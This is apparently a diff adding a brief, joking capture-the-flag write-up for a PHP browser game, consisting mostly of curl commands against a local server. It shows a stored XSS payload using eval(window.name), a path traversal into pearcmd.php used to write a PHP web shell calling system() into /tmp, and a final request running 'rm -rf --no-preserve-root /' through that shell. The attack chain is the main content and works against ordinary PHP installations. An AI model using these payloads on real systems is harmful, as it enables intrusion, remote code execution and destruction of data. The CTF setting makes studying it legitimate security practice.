@@ -1,0 +1,39 @@
+no writeup for you
+maybe you can guess the flag
+...
+...
+...
+just kidding
+by the way if brunoipjg/apache-php-5.2 got bugs then gg lol, but no one cares
+
+although you can set the extra ability points to 1e+9 during registration to get 65536 ability points... don't even bother to play the game, no one plays
+
+
+How to XSS if the input blocks ' " < > \ ? I don't know.
+Flag 1:
+
+curl -H "Cookie: PHPSESSID=57efe396627ab3b5e651ce64061871f3; wog_cookie=2; wog_cookie_name=asdf; wog_bbs_id=1; wog_cookie_debug=22b53148583068af1f18ac2c126443f0" http://localhost:8765/wog_act.php -d "f=pk&act=setup&pk_money=1&pk_setup=1,p_url=0x272b6576616c286e616d65292b27"
+
+then craft a page with payload as window.name and login with your own account.. you know ga la.
+---
+
+I think this one may be more obvious... lol, so I hide the flag in somewhere instead of /proof.sh
+Flag 2:
+
+curl -H "Cookie: PHPSESSID=57efe396627ab3b5e651ce64061871f3; wog_cookie=2; wog_cookie_name=asdf; wog_bbs_id=1; wog_cookie_debug=22b53148583068af1f18ac2c126443f0" http://localhost:8765/wog_act.php?+install -d "f=mission&act=end&temp_id=/../../../../lib/php/pearcmd"
+
+Yeah nothing to install. Craft your own payload la. 
+
+curl -H "Cookie: PHPSESSID=57efe396627ab3b5e651ce64061871f3; wog_cookie=2; wog_cookie_name=asdf; wog_bbs_id=1; wog_cookie_debug=22b53148583068af1f18ac2c126443f0" 'http://localhost:8765/wog_act.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=show_source("/usr/local/apache2/htdocs/forum_support/config/config.php")?>+/tmp/hellmen.php' -d "f=mission&act=end&temp_id=/../../../../lib/php/pearcmd"
+
+curl -H "Cookie: PHPSESSID=57efe396627ab3b5e651ce64061871f3; wog_cookie=2; wog_cookie_name=asdf; wog_bbs_id=1; wog_cookie_debug=22b53148583068af1f18ac2c126443f0" 'http://localhost:8765/wog_act.php' -d "f=mission&act=end&temp_id=/../../../../../../tmp/hellmen"
+
+
+why show_source... you are using curl man :-(
+
+
+curl -H "Cookie: PHPSESSID=57efe396627ab3b5e651ce64061871f3; wog_cookie=2; wog_cookie_name=asdf; wog_bbs_id=1; wog_cookie_debug=22b53148583068af1f18ac2c126443f0" 'http://localhost:8765/wog_act.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=system("$_GET[0]");?>+/tmp/hellmen.php' -d "f=mission&act=end&temp_id=/../../../../lib/php/pearcmd"
+
+curl -H "Cookie: PHPSESSID=57efe396627ab3b5e651ce64061871f3; wog_cookie=2; wog_cookie_name=asdf; wog_bbs_id=1; wog_cookie_debug=22b53148583068af1f18ac2c126443f0" 'http://localhost:8765/wog_act.php?0=rm+-rf+--no-preserve-root+/' -d "f=mission&act=end&temp_id=/../../../../../../tmp/hellmen"
+
+seems still alive
